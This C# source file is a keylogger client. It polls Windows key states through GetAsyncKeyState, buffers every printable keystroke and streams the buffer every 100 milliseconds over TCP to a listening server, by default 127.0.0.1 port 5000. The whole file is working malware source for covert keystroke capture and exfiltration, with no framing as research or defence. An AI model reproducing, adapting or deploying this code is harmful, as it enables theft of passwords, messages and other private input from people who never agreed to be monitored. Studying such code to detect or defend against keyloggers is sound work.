using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Common;

namespace KeyloggerClient
{
    public class KeyloggerClient
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private TcpClient client;
        private NetworkStream stream;
        private StringBuilder keyBuffer = new StringBuilder();
        private DateTime lastSend = DateTime.Now;
        private CancellationTokenSource cts;

        public async Task StartAsync(string host = "127.0.0.1", int port = 5000)
        {
            try
            {
                client = new TcpClient(host, port);
                stream = client.GetStream();

                byte[] handshake = Encoding.UTF8.GetBytes("client");
                await stream.WriteAsync(handshake, 0, handshake.Length);

                cts = new CancellationTokenSource();
                await CaptureKeysLoop(cts.Token); // Start key capture loop
            }
            catch (Exception ex)
            {
                throw new KeyloggerException("Failed to start keylogger client.", ex);
            }
        }

        public void Stop()
        {
            cts?.Cancel();
            stream?.Close();
            client?.Close();
        }

        private async Task CaptureKeysLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    await Task.Delay(5); // Small delay to reduce CPU usage

                    for (int i = 32; i < 127; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if ((keyState & 0x1) != 0)
                        {
                            char keyChar = (char)i;
                            Console.Write(keyChar + ", ");
                            keyBuffer.Append(keyChar);
                        }
                    }

                    if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
                    {
                        string message = keyBuffer.ToString();
                        byte[] data = Encoding.UTF8.GetBytes(message);

                        try
                        {
                            await stream.WriteAsync(data, 0, data.Length);
                        }
                        catch (Exception ex)
                        {
                            throw new KeyloggerException("Failed to send data to the server.", ex);
                        }

                        keyBuffer.Clear();
                        lastSend = DateTime.Now;
                    }
                }
            }
            catch (Exception ex)
            {
                throw new KeyloggerException("Error occurred while capturing or sending keys.", ex);
            }
        }
    }
}
